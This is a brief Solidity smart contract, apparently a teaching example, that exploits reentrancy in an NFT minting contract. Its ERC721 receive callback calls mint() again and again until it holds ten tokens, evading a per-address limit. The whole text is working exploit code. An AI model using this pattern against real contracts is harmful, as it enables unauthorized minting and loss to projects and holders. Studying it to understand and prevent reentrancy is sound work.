contract Attack is IERC721Receiver {
    NFTReentrancy public nft; // Address of the NFT contract

    // Initialize the NFT contract address
    constructor(NFTReentrancy _nftAddr) {
        nft = _nftAddr;
    }

    // Attack function to initiate the attack
    function attack() external {
        nft.mint();
    }

    // Callback function for ERC721, repeatedly calls the mint function to mint 10 NFTs
    function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
        if(nft.balanceOf(address(this)) < 10){
            nft.mint();
        }
        return this.onERC721Received.selector;
    }
}